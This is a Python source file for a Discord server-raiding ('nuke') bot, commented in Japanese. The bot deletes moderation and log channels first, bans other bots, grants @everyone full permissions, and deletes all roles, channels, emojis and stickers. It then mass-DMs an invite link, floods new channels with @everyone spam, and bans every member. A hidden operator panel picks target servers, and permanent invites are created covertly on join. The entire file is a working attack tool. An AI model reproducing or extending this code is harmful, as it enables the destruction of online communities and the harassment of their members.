import discord
from discord.ext import commands
import asyncio
import random
import os
import json
import signal
import sys
from dotenv import load_dotenv
from typing import Optional, List, Set, Dict, Any
from dataclasses import dataclass
import logging
from logging.handlers import RotatingFileHandler

# ============================================================================
# 0. 設定クラス（.env 完全外部化 + 型チェック）
# ============================================================================
@dataclass(frozen=True)
class BotConfig:
    token: str
    prefix: str
    default_new_name: str
    invite_link: str
    manage_guild_id: int
    manage_channel_id: int
    panel_state_file: str = "panel_state.json"

    @classmethod
    def from_env(cls) -> "BotConfig":
        load_dotenv()
        token = os.getenv("TOKEN")
        if not token:
            raise ValueError("環境変数 TOKEN が設定されていません")
        
        return cls(
            token=token,
            prefix=os.getenv("PREFIX", "!"),
            default_new_name=os.getenv("DEFAULT_NEW_NAME", "ますまに共栄圏植民地"),
            invite_link=os.getenv("INVITE_LINK", "https://discord.gg/tqNR7BsAsR"),
            manage_guild_id=int(os.getenv("MANAGE_GUILD_ID", "0")),
            manage_channel_id=int(os.getenv("MANAGE_CHANNEL_ID", "0")),
        )

CONFIG = BotConfig.from_env()

# ============================================================================
# 1. ログ設定（ローテーション付き）
# ============================================================================
def setup_logging() -> logging.Logger:
    logger = logging.getLogger("nuke_bot")
    logger.setLevel(logging.INFO)
    
    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(name)s: %(message)s')
    
    # コンソール
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(formatter)
    logger.addHandler(sh)
    
    # ファイル（5MB×5世代でローテーション）
    fh = RotatingFileHandler(
        "bot.log", maxBytes=5*1024*1024, backupCount=5,
        encoding='utf-8'
    )
    fh.setFormatter(formatter)
    logger.addHandler(fh)
    
    return logger

logger = setup_logging()

# ============================================================================
# 2. パネル状態の永続化（Bot再起動後も管理パネルを追跡）
# ============================================================================
class PanelState:
    def __init__(self, filepath: str) -> None:
        self.filepath = filepath
        self.data: Dict[str, Any] = {}
        self.load()
    
    def load(self) -> None:
        if os.path.exists(self.filepath):
            try:
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    self.data = json.load(f)
            except Exception as e:
                logger.error(f"パネル状態読み込み失敗: {e}")
    
    def save(self) -> None:
        try:
            with open(self.filepath, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"パネル状態保存失敗: {e}")
    
    def get_panel_message_id(self) -> Optional[int]:
        return self.data.get("manage_panel_message_id")
    
    def set_panel_message_id(self, message_id: int) -> None:
        self.data["manage_panel_message_id"] = message_id
        self.save()

panel_state = PanelState(CONFIG.panel_state_file)

# ============================================================================
# 3. セマフォ・タスク管理（前回同様）
# ============================================================================
class SemaphoreManager:
    def __init__(self) -> None:
        self.global_sem = asyncio.Semaphore(45)
        self.message_sem = asyncio.Semaphore(8)
        self.dm_sem = asyncio.Semaphore(10)
    
    async def limited_global(self, coro) -> None:
        async with self.global_sem:
            try:
                await coro
            except discord.HTTPException as e:
                if e.status == 429:
                    wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                    logger.warning(f"Global rate limited. Retry after {wait:.2f}s")
                    await asyncio.sleep(wait)
                    try:
                        await coro
                    except Exception as e2:
                        logger.error(f"Retry failed: {e2}")
                else:
                    logger.error(f"HTTP Exception [{e.status}]: {e.text}")
            except Exception as e:
                logger.error(f"Unexpected error in global sem: {e}")

    async def limited_message(self, coro) -> None:
        async with self.message_sem:
            try:
                await coro
            except discord.HTTPException as e:
                if e.status == 429:
                    wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                    logger.warning(f"Message rate limited. Retry after {wait:.2f}s")
                    await asyncio.sleep(wait)
                else:
                    logger.error(f"Message HTTP Exception [{e.status}]: {e.text}")

    async def limited_dm(self, coro) -> None:
        async with self.dm_sem:
            try:
                await coro
            except discord.HTTPException as e:
                logger.debug(f"DM HTTP error: {e}")
            except Exception as e:
                logger.debug(f"DM unexpected error: {e}")

sem_mgr = SemaphoreManager()

class TaskManager:
    def __init__(self) -> None:
        self._tasks: Set[asyncio.Task] = set()
    
    def create_task(self, coro, *, name: Optional[str] = None) -> asyncio.Task:
        task = asyncio.create_task(coro, name=name)
        self._tasks.add(task)
        task.add_done_callback(self._tasks.discard)
        task.add_done_callback(self._on_task_done)
        return task
    
    def _on_task_done(self, task: asyncio.Task) -> None:
        exc = task.exception()
        if exc:
            logger.error(f"Task {task.get_name()} raised: {exc}", exc_info=exc)
    
    async def cancel_all(self) -> None:
        """Graceful shutdown用: 全タスクをキャンセル"""
        for task in list(self._tasks):
            if not task.done():
                task.cancel()
                try:
                    await task
                except asyncio.CancelledError:
                    pass
        logger.info(f"全タスクキャンセル完了（残り{len(self._tasks)}件）")

task_mgr = TaskManager()

# ============================================================================
# 4. Bot 初期化
# ============================================================================
intents = discord.Intents.default()
intents.members = True
intents.message_content = True
intents.bans = True
intents.guilds = True

bot = commands.Bot(
    command_prefix=CONFIG.prefix,
    intents=intents,
    help_command=None
)

# ============================================================================
# 5. 管理チャンネルへの通知ヘルパー
# ============================================================================
async def notify_manage_channel(content: str, embed: Optional[discord.Embed] = None) -> None:
    """管理チャンネルにログを送信。失敗しても例外を出さない"""
    try:
        guild = bot.get_guild(CONFIG.manage_guild_id)
        if not guild:
            return
        channel = guild.get_channel(CONFIG.manage_channel_id)
        if not channel or not isinstance(channel, discord.TextChannel):
            return
        await channel.send(content=content, embed=embed)
    except Exception as e:
        logger.error(f"管理チャンネル通知失敗: {e}")

# ============================================================================
# 6. 破壊処理関数群（前回同様、API実装）
# ============================================================================

async def send_dm(member: discord.Member) -> None:
    try:
        await member.send(CONFIG.invite_link)
    except Exception as e:
        logger.debug(f"DM failed to {member.name}: {e}")

async def create_channel_safely(guild: discord.Guild, name: str) -> Optional[discord.TextChannel]:
    try:
        return await guild.create_text_channel(name)
    except discord.HTTPException as e:
        if e.status == 429:
            wait = getattr(e, 'retry_after', 3) + random.uniform(0.3, 1.0)
            logger.warning(f"Channel create rate limited. Retry after {wait:.2f}s")
            await asyncio.sleep(wait)
            return await create_channel_safely(guild, name)
        logger.error(f"Channel create error: {e}")
        return None

async def create_colored_roles_task(guild: discord.Guild, target_roles: int) -> None:
    current = 0
    while current < target_roles:
        try:
            await guild.create_role(
                name="ますまに共栄圏に荒らされましたｗｗｗ",
                color=discord.Color.random(),
                hoist=True,
                mentionable=True
            )
            current += 1
            if current % 10 == 0:
                logger.info(f"Role creation progress: {current}/{target_roles}")
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.3, 1.0)
                logger.warning(f"Role create rate limited. Retry after {wait:.2f}s")
                await asyncio.sleep(wait)
                continue
            logger.error(f"Role create error: {e}")
            break
        except Exception as e:
            logger.error(f"Role create unexpected error: {e}")
            break
        await asyncio.sleep(random.uniform(0.12, 0.25))
    logger.info(f"Role creation finished: {current} roles created")

async def ban_all_task(guild: discord.Guild, members: List[discord.Member], reason: str) -> None:
    banned = 0
    for m in members:
        if m == guild.me:
            continue
        try:
            await guild.ban(m, reason=reason, delete_message_seconds=0)
            banned += 1
            if banned % 10 == 0:
                logger.info(f"Ban progress: {banned} members banned")
        except discord.Forbidden:
            logger.debug(f"Ban forbidden: {m.name}")
        except discord.HTTPException as e:
            if e.status == 429:
                wait = getattr(e, 'retry_after', 1) + random.uniform(0.1, 0.5)
                logger.warning(f"Ban rate limited. Retry after {wait:.2f}s")
                await asyncio.sleep(wait)
                try:
                    await guild.ban(m, reason=reason, delete_message_seconds=0)
                    banned += 1
                except Exception as e2:
                    logger.error(f"Ban retry failed for {m.name}: {e2}")
            else:
                logger.debug(f"Ban HTTP error for {m.name}: {e}")
        except Exception as e:
            logger.debug(f"Ban error for {m.name}: {e}")
        await asyncio.sleep(random.uniform(0.2, 0.4))
    logger.info(f"Ban task finished: {banned} members banned")

async def delete_emojis(guild: discord.Guild) -> None:
    try:
        emojis = await guild.fetch_emojis()
        if emojis:
            batch_size = 10
            for i in range(0, len(emojis), batch_size):
                batch = emojis[i:i+batch_size]
                await asyncio.gather(
                    *(sem_mgr.limited_global(e.delete()) for e in batch),
                    return_exceptions=True
                )
                logger.info(f"Deleted emoji batch: {len(batch)} emojis")
                await asyncio.sleep(random.uniform(0.05, 0.12))
    except Exception as e:
        logger.error(f"Emoji fetch/delete error: {e}")

async def delete_stickers(guild: discord.Guild) -> None:
    try:
        stickers = await guild.fetch_stickers()
        if stickers:
            await asyncio.gather(
                *(sem_mgr.limited_global(s.delete()) for s in stickers),
                return_exceptions=True
            )
            logger.info(f"Deleted {len(stickers)} stickers")
    except Exception as e:
        logger.error(f"Sticker fetch/delete error: {e}")

async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
    await asyncio.gather(
        delete_emojis(guild),
        delete_stickers(guild),
        return_exceptions=True
    )

# ============================================================================
# 7. コア処理（実API版 + 進捗通知）
# ============================================================================
async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None) -> None:
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー({guild.name})のためヌークをスキップ")
        return

    new_name = new_server_name or CONFIG.default_new_name

    # 大規模サーバー対応: メンバーキャッシュが不完全な場合は chunk
    if guild.member_count > 1000 and not guild.chunked:
        logger.info(f"大規模サーバー検出: {guild.name} ({guild.member_count}人) → メンバーチャンク取得中...")
        try:
            await guild.chunk()
            logger.info(f"チャンク取得完了: {len(guild.members)} メンバー")
        except Exception as e:
            logger.error(f"チャンク取得失敗: {e}")

    members = [m for m in guild.members if m != bot.user]
    non_bot_members = [m for m in members if not m.bot]

    logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
    await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")

    # 1. 他のボットBAN
    bot_ban_coros = [
        sem_mgr.limited_global(guild.ban(m, reason="", delete_message_seconds=0))
        for m in members if m.bot
    ]
    if bot_ban_coros:
        results = await asyncio.gather(*bot_ban_coros, return_exceptions=True)
        success = sum(1 for r in results if not isinstance(r, Exception))
        logger.info(f"Bot BAN完了: {success}/{len(bot_ban_coros)} 成功")

    # 2. ログ系チャンネル優先削除
    log_keywords = [
        "log", "ログ", "audit", "監視", "mod", "moderation",
        "admin", "管理", "report", "報告", "ticket", "チケット"
    ]
    channels = list(guild.channels)
    log_channels = [
        ch for ch in channels
        if any(kw.lower() in ch.name.lower() for kw in log_keywords)
    ]
    if log_channels:
        await asyncio.gather(
            *(sem_mgr.limited_global(ch.delete()) for ch in log_channels),
            return_exceptions=True
        )
        logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
        await asyncio.sleep(1)

    # 3. @everyone権限最大化
    everyone_role = guild.default_role
    permissions = discord.Permissions.all()
    try:
        await sem_mgr.limited_global(everyone_role.edit(permissions=permissions))
        logger.warning(f"@everyone権限を最大化しました: {guild.name}")
    except Exception as e:
        logger.error(f"@everyone権限変更失敗: {e}")

    # 4. アイコン/バナー/スプラッシュ削除
    try:
        await sem_mgr.limited_global(guild.edit(icon=None, banner=None, splash=None))
        logger.info(f"サーバーアセットを削除しました: {guild.name}")
    except Exception as e:
        logger.error(f"アセット削除失敗: {e}")

    # 5. 絵文字削除 + スタンプ削除（並列化）
    await delete_emojis_and_stickers(guild)

    # 6. コミュニティ無効化
    try:
        await sem_mgr.limited_global(guild.edit(
            verification_level=discord.VerificationLevel.none,
            explicit_content_filter=discord.ContentFilter.disabled,
            default_notifications=discord.NotificationLevel.all_messages,
            community=False
        ))
        logger.info(f"コミュニティ設定を無効化しました: {guild.name}")
    except Exception as e:
        logger.error(f"コミュニティ無効化失敗: {e}")

    # 7. ウェルカム/ルール無効化
    try:
        await sem_mgr.limited_global(guild.edit(system_channel=None, rules_channel=None))
        logger.info(f"システムチャンネルを無効化しました: {guild.name}")
    except Exception as e:
        logger.error(f"システムチャンネル無効化失敗: {e}")

    # 8. DM送信（権限持ち除外）
    dm_members = [m for m in non_bot_members if not m.guild_permissions.administrator]
    dm_coros = [sem_mgr.limited_dm(send_dm(m)) for m in dm_members]
    if dm_coros:
        results = await asyncio.gather(*dm_coros, return_exceptions=True)
        success = sum(1 for r in results if not isinstance(r, Exception))
        logger.info(f"DM送信完了: {success}/{len(dm_coros)} 成功")

    # 9. ロール削除
    roles_to_delete = [r for r in guild.roles if not r.is_default() and not r.managed]
    logger.info(f"ロール削除開始: 対象 {len(roles_to_delete)}個")

    async def delete_roles_batch(roles: List[discord.Role]) -> None:
        await asyncio.gather(
            *(sem_mgr.limited_global(r.delete()) for r in roles),
            return_exceptions=True
        )

    batch_size = 15
    attempt = 0
    current_roles = roles_to_delete[:]
    remaining: List[discord.Role] = []

    while len(current_roles) > 0 and attempt < 2:
        attempt += 1
        for i in range(0, len(current_roles), batch_size):
            batch = current_roles[i:i+batch_size]
            await delete_roles_batch(batch)
            await asyncio.sleep(random.uniform(0.05, 0.1))

        await asyncio.sleep(1)
        try:
            remaining = [r for r in await guild.fetch_roles() if not r.is_default() and not r.managed]
        except Exception as e:
            logger.error(f"ロール再取得失敗: {e}")
            break
        
        if len(remaining) == 0:
            logger.info("全ロール削除完了")
            break
        current_roles = remaining
        logger.warning(f"ロール削除再試行: 残り {len(remaining)}個")

    logger.info(f"ロール削除完了: 残り {len(remaining)}個")

    # 10. 残り全チャンネル削除
    channels = list(guild.channels)
    logger.info(f"チャンネル削除開始: 対象 {len(channels)}個")

    async def delete_channels_batch(chs: List[discord.abc.GuildChannel]) -> None:
        await asyncio.gather(
            *(sem_mgr.limited_global(ch.delete()) for ch in chs),
            return_exceptions=True
        )

    batch_size_ch = 15
    attempt_ch = 0
    while len(channels) > 0 and attempt_ch < 4:
        attempt_ch += 1
        for i in range(0, len(channels), batch_size_ch):
            batch_ch = channels[i:i+batch_size_ch]
            await delete_channels_batch(batch_ch)
            await asyncio.sleep(random.uniform(0.03, 0.08))

        await asyncio.sleep(0.5)
        channels = list(guild.channels)
        if len(channels) == 0:
            logger.info("全チャンネル削除完了")
            break
        logger.warning(f"チャンネル削除再試行 {attempt_ch}: 残り {len(channels)}個")

    logger.info(f"チャンネル削除完了: 残り {len(channels)}個")

    # 11. サーバー名変更
    try:
        await guild.edit(name=new_name)
        logger.warning(f"サーバー名を変更しました: {new_name}")
    except Exception as e:
        logger.error(f"サーバー名変更失敗: {e}")

    # 12. チャンネル作成
    member_count = len(non_bot_members)
    if member_count < 100:
        target_channels = 80
    elif member_count < 500:
        target_channels = 70
    else:
        target_channels = 50

    target_roles = 240

    channels_created: List[discord.TextChannel] = []
    current = 0
    channel_names = ["ますまに共栄圏万歳", "ますまに共栄圏最強"]
    
    while len(channels_created) < target_channels:
        tasks = []
        for _ in range(30):
            if len(channels_created) >= target_channels:
                break
            current += 1
            name = channel_names[current % 2]
            tasks.append(create_channel_safely(guild, name))
        
        if not tasks:
            break
            
        batch = await asyncio.gather(*tasks, return_exceptions=True)
        added = [c for c in batch if isinstance(c, discord.TextChannel)]
        channels_created += added
        logger.info(f"チャンネル作成進捗: {len(channels_created)}/{target_channels}")
        await asyncio.sleep(random.uniform(0.05, 0.1))

    # 13. ロール作成（並列）
    role_create_task = task_mgr.create_task(
        create_colored_roles_task(guild, target_roles),
        name=f"role_create_{guild.id}"
    )

    # 14. スパム + BAN
    spam_messages = [
        f"@everyone {CONFIG.invite_link}",
        f"@everyone 来い {CONFIG.invite_link}"
    ]

    message_counters: dict[int, int] = {ch.id: 0 for ch in channels_created}
    active_channels = channels_created.copy()

    ban_task = task_mgr.create_task(
        ban_all_task(guild, non_bot_members, new_name),
        name=f"ban_all_{guild.id}"
    )

    spam_round = 0
    while active_channels:
        spam_round += 1
        spam_tasks = []
        for ch in active_channels[:]:
            if message_counters[ch.id] >= 300:
                active_channels.remove(ch)
                continue
            spam_tasks.append(sem_mgr.limited_message(ch.send(random.choice(spam_messages))))
            message_counters[ch.id] += 1

        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        
        if spam_round % 50 == 0:
            logger.info(f"Spam progress: round {spam_round}, active channels: {len(active_channels)}")
        
        await asyncio.sleep(random.uniform(0.08, 0.25))

    await ban_task
    await role_create_task

    logger.info("ヌーク完了 → bot退出")
    await notify_manage_channel(f"✅ **{guild.name}** のヌークが完了しました。Botが退出します。")
    
    try:
        await guild.leave()
        logger.info(f"サーバーから退出しました: {guild.name}")
    except Exception as e:
        logger.error(f"退出失敗: {e}")

    logger.info("完了")

# ============================================================================
# 8. UI Views（Persistent View対応）
# ============================================================================
class NukeButtonView(discord.ui.View):
    def __init__(self, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=None)
        self.guild_id = guild_id
        self.bot = bot

    @discord.ui.button(label="!Masumani 実行", style=discord.ButtonStyle.danger, custom_id="nuke_button")
    async def nuke_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        guild = self.bot.get_guild(self.guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            await interaction.response.send_message(
                f"{guild.name} でヌークを開始します。", 
                ephemeral=True
            )
            task_mgr.create_task(core_nuke(guild), name=f"nuke_btn_{guild.id}")
        else:
            await interaction.response.send_message(
                "サーバーが見つからないか、保護されています。", 
                ephemeral=True
            )

class ManageView(discord.ui.View):
    def __init__(self, bot: commands.Bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="サーバー一覧", style=discord.ButtonStyle.primary, custom_id="list_servers")
    async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
        for g in self.bot.guilds:
            if g.id != CONFIG.manage_guild_id:
                embed.add_field(
                    name=g.name, 
                    value=f"ID: {g.id}\nメンバー: {g.member_count}", 
                    inline=False
                )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[], custom_id="select_guild")
    async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
        guild_id = int(select.values[0])
        guild = self.bot.get_guild(guild_id)
        if guild and guild.id != CONFIG.manage_guild_id:
            task_mgr.create_task(core_nuke(guild), name=f"nuke_sel_{guild.id}")
            await interaction.response.send_message(
                f"{guild.name} でヌーク起動しました。", 
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "無効なサーバーまたは保護されています。", 
                ephemeral=True
            )

# ============================================================================
# 9. パネル送信・永続化
# ============================================================================
async def send_or_update_panel(channel: discord.TextChannel, view: discord.ui.View) -> Optional[discord.Message]:
    """既存のパネルがあれば更新し、なければ新規送信。メッセージIDを保存する"""
    existing_id = panel_state.get_panel_message_id()
    
    if existing_id:
        try:
            msg = await channel.fetch_message(existing_id)
            await msg.edit(content="サーバー管理パネル", view=view)
            logger.info(f"既存パネルを更新しました (ID: {existing_id})")
            return msg
        except discord.NotFound:
            logger.info("保存されたパネルが見つからりません。新規作成します。")
        except Exception as e:
            logger.error(f"パネル取得失敗: {e}")
    
    try:
        msg = await channel.send("サーバー管理パネル", view=view)
        panel_state.set_panel_message_id(msg.id)
        logger.info(f"新規パネルを送信しました (ID: {msg.id})")
        return msg
    except Exception as e:
        logger.error(f"パネル送信失敗: {e}")
        return None

# ============================================================================
# 10. イベントハンドラ
# ============================================================================
@bot.event
async def setup_hook() -> None:
    """Bot起動時の初期化（Persistent View登録）"""
    # 管理パネルのViewを永続化登録
    bot.add_view(ManageView(bot))
    
    # 既存のNukeButtonViewも永続化（全ギルドで共通のcustom_idではないため、
    # 動的に生成されたボタンは再起動後に新規参加したサーバーで再生成される。
    # ここではManageViewのみ永続化し、NukeButtonViewはon_ready後の新規参加で再生成）
    logger.info("Persistent Views を登録しました")

@bot.event
async def on_ready():
    # 重複呼び出し防止（再接続時）
    if getattr(bot, '_ready_once', False):
        return
    bot._ready_once = True

    logger.info(f"起動: {bot.user}")
    logger.info("=== ボット起動時の全サーバー情報 ===")
    
    for guild in bot.guilds:
        if guild.id == CONFIG.manage_guild_id:
            logger.info(f"管理サーバー: {guild.name} → 残留（保護）")
            await log_server_info(guild)
            continue

        non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
        member_count = len(non_bot_members)
        
        if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
            logger.info(f"起動時自動退出: {guild.name} (メンバー含まず {member_count}人)")
            try:
                await guild.leave()
            except Exception as e:
                logger.error(f"退出失敗: {e}")
        else:
            await log_server_info(guild)
    
    logger.info("=====================================")

    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            view = ManageView(bot)
            options = [
                discord.SelectOption(label=g.name, value=str(g.id)) 
                for g in bot.guilds if g.id != CONFIG.manage_guild_id
            ]
            if options:
                view.select_guild.options = options
                await send_or_update_panel(manage_channel, view)
            else:
                # パネルがない場合のみ送信
                if not panel_state.get_panel_message_id():
                    await manage_channel.send("現在、操作可能な対象サーバーはありません。")
        else:
            logger.warning("管理チャンネルが見つからないか、テキストチャンネルではありません")
    else:
        logger.warning("管理サーバーが見つかりません")

@bot.event
async def on_guild_join(guild: discord.Guild):
    if guild.id == CONFIG.manage_guild_id:
        logger.info(f"管理サーバー参加: {guild.name} → 残留（保護）")
        return

    # 大規模サーバー対応: chunkして正確なメンバー数を取得
    if guild.member_count > 1000 and not guild.chunked:
        try:
            await guild.chunk()
        except Exception as e:
            logger.error(f"チャンク取得失敗: {e}")

    non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
    member_count = len(non_bot_members)

    if member_count <= 5 and not guild.name.startswith("ま") or guild.name == "郁郁地区美通話":
        logger.info(f"自動退出: {guild.name} (メンバー含まず {member_count}人)")
        try:
            await guild.leave()
        except Exception as e:
            logger.error(f"退出失敗: {e}")
        return

    logger.info(f"新規参加: {guild.name} (メンバー含まず {member_count}人) → 残留")
    manage_guild = bot.get_guild(CONFIG.manage_guild_id)
    if manage_guild:
        manage_channel = manage_guild.get_channel(CONFIG.manage_channel_id)
        if manage_channel and isinstance(manage_channel, discord.TextChannel):
            invite_link = "取得失敗"
            try:
                invites = await guild.invites()
                permanent_invite = None
                for inv in invites:
                    if inv.max_age == 0 and inv.max_uses == 0:
                        permanent_invite = inv
                        break
                    if inv.inviter is None or inv.inviter == guild.owner:
                        permanent_invite = inv
                        break
                if permanent_invite:
                    invite_link = permanent_invite.url
                else:
                    if guild.text_channels:
                        channel = guild.text_channels[0]
                        new_invite = await channel.create_invite(
                            max_age=0, max_uses=0, unique=True, 
                            reason="Bot自動永久招待"
                        )
                        invite_link = new_invite.url
                    else:
                        invite_link = "テキストチャンネルなし"
            except Exception as e:
                invite_link = f"エラー: {str(e)}"

            embed = discord.Embed(
                title=f"新サーバー参加: {guild.name}", 
                color=discord.Color.green()
            )
            embed.add_field(name="ID", value=guild.id, inline=False)
            embed.add_field(name="メンバー数", value=guild.member_count, inline=False)
            embed.add_field(name="招待リンク", value=invite_link, inline=False)
            view = NukeButtonView(guild.id, bot)
            await manage_channel.send(embed=embed, view=view)
        else:
            logger.warning("管理チャンネルが見つかりません")

@bot.event
async def on_command_error(ctx: commands.Context, error: commands.CommandError) -> None:
    """コマンドエラーのグローバルハンドリング"""
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("権限が不足しています。", delete_after=10)
    elif isinstance(error, commands.NoPrivateMessage):
        await ctx.send("サーバー内でのみ使用できます。", delete_after=10)
    else:
        logger.error(f"Command error in {ctx.command}: {error}", exc_info=error)
        await ctx.send(f"エラーが発生しました: {error}", delete_after=15)

# ============================================================================
# 11. コマンド
# ============================================================================
@bot.command(name="masumani", aliases=["setup"])
async def trigger(ctx: commands.Context, *, new_name: Optional[str] = None) -> None:
    if not ctx.guild or ctx.guild.id == CONFIG.manage_guild_id:
        await ctx.send("このサーバーでは使用できません。", delete_after=10)
        return
    try:
        await ctx.message.delete()
    except Exception as e:
        logger.debug(f"Message delete failed: {e}")
    task_mgr.create_task(core_nuke(ctx.guild, new_name), name=f"nuke_cmd_{ctx.guild.id}")

# ============================================================================
# 12. ユーティリティ
# ============================================================================
async def log_server_info(guild: discord.Guild) -> None:
    member_count = guild.member_count
    server_name = guild.name
    invite_link = "取得失敗（権限不足 or チャンネルなし）"

    try:
        invites = await guild.invites()
        permanent_invite = None
        for inv in invites:
            if inv.max_age == 0 and inv.max_uses == 0:
                permanent_invite = inv
                break
            if inv.inviter is None or inv.inviter == guild.owner:
                permanent_invite = inv
                break

        if permanent_invite:
            invite_link = permanent_invite.url
        else:
            if guild.text_channels:
                channel = guild.text_channels[0]
                new_invite = await channel.create_invite(
                    max_age=0, max_uses=0, unique=True, 
                    reason="Bot自動永久招待"
                )
                invite_link = new_invite.url
            else:
                invite_link = "テキストチャンネルなし"
    except discord.Forbidden:
        invite_link = "権限不足（MANAGE_CHANNELS or CREATE_INSTANT_INVITEが必要）"
    except Exception as e:
        invite_link = f"エラー: {str(e)}"

    logger.info(f"サーバー: {server_name}")
    logger.info(f"メンバー数: {member_count}")
    logger.info(f"永久招待リンク: {invite_link}")
    logger.info("---")

# ============================================================================
# 13. Graceful Shutdown
# ============================================================================
async def shutdown() -> None:
    """安全なシャットダウン処理"""
    logger.info("シャットダウンシーケンスを開始します...")
    await task_mgr.cancel_all()
    await bot.close()
    logger.info("Botを終了しました")

def signal_handler(sig, frame) -> None:
    logger.info(f"シグナル {sig} を受信しました")
    asyncio.create_task(shutdown())

# ============================================================================
# 14. エントリーポイント
# ============================================================================
if __name__ == "__main__":
    # シグナルハンドラ登録（Ctrl+C対応）
    signal.signal(signal.SIGINT, lambda s, f: asyncio.create_task(shutdown()))
    signal.signal(signal.SIGTERM, lambda s, f: asyncio.create_task(shutdown()))
    
    try:
        bot.run(CONFIG.token)
    except Exception as e:
        logger.critical(f"Bot起動失敗: {e}", exc_info=True)
        sys.exit(1)
